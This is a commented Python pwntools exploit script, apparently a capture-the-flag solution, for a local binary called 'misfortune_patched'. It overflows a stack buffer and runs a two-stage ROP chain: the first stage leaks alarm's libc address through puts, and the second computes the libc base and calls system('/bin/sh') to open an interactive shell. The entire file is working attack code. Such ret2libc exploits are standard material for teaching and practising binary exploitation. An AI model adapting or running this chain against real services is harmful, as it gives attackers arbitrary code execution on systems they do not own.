#!/usr/bin/env python3

# Import the pwntools library, which provides functions for binary exploitation
from pwn import *

# Define paths to the binary, libc, and loader ELF files
exe = ELF("./misfortune_patched")  # Target executable
libc = ELF("./libc.so.6")          # Libc file for function resolution
ld = ELF("./ld-2.27.so")           # Loader for handling binary dependencies

# Initialize ROP and set up gadgets for our exploit
rop = ROP(exe)
pop_rdi = rop.find_gadget(["pop rdi"])[0]  # Gadget to control RDI register (argument passing)
ret = rop.find_gadget(["ret"])[0]          # Single 'ret' gadget for stack alignment
success(f"{hex(pop_rdi)=}")                # Print gadget addresses for verification
success(f"{hex(ret)=}")

# Locate main function address in binary to return control flow there
main_function = exe.symbols.main

# Locate 'puts' function in the PLT and 'alarm' entry in the GOT
puts_plt = exe.plt.puts  # 'puts' function entry in the Procedure Linkage Table (PLT)
alarm_got = exe.got.alarm  # 'alarm' function entry in the Global Offset Table (GOT)
success(f"{hex(puts_plt)=}")
success(f"{hex(alarm_got)=}")

# Set pwntools' context for binary information (architecture, OS)
context.binary = exe

# Function to start a connection, optionally with gdb debugging
def conn():
    r = gdb.debug([exe.path])  # Launches gdb on the binary for debugging
    return r

# Main exploit function
def main():
    offset = 32  # Calculated buffer offset to reach return address
    length = 90  # Total payload length to maintain padding
    r = conn()
    
    # Receive initial prompt from the program to synchronize
    prompt = r.recvuntil(b"\n> ")

    # Craft payload to leak 'alarm' function address from the GOT using 'puts'
    payload = b"".join([
        b"A" * offset,      # Buffer overflow padding
        p64(ret),           # Alignment 'ret' to prevent crashes on 64-bit systems
        p64(pop_rdi),       # ROP chain gadget to set up RDI (argument for puts)
        p64(alarm_got),     # Address of 'alarm' in GOT for leaking its libc address
        p64(puts_plt),      # PLT address for 'puts' to print alarm's libc address
        p64(main_function)  # Return to main function for repeated exploitation
    ])
    payload += b"C" * (length - len(payload))  # Final padding to meet length

    # Send payload and retrieve leaked address of 'alarm' in libc
    r.send(payload)
    alarm_libc = u64(r.recvline().strip().ljust(8, b"\x00"))  # Parse leaked address
    success(f"{hex(alarm_libc)=}")

    # Calculate base address of libc using 'alarm' offset
    libc_base = alarm_libc - libc.symbols.alarm
    success(f"{hex(libc_base)=}")
    libc.address = libc_base  # Set base address in libc for symbol resolution

    # Retrieve addresses of 'system' and '/bin/sh' within libc for shell execution
    system = libc.symbols.system  # Address of 'system' function
    bin_sh = next(libc.search(b"/bin/sh\x00"))  # Address of '/bin/sh' string in libc
    success(f"{hex(system)=}")
    success(f"{hex(bin_sh)=}")

    #############################BREAK###############################
    prompt = r.recvuntil(b"\n> ")  # Wait for program to be ready for the next payload

    # Craft final payload to spawn a shell by calling 'system("/bin/sh")'
    payload = b"".join([
        b"A" * offset,      # Buffer overflow padding
        p64(ret),           # Alignment 'ret' for ROP stability
        p64(pop_rdi),       # Gadget to set up RDI for '/bin/sh' argument
        p64(bin_sh),        # Address of '/bin/sh' string in libc
        p64(ret),           # Additional 'ret' for stack alignment
        p64(system)         # Address of 'system' to execute the shell
    ])
    payload += b"C" * (length - len(payload))  # Final padding for payload length

    r.send(payload)  # Send final payload
    r.interactive()  # Open interactive shell to control the program

if __name__ == "__main__":
    main()
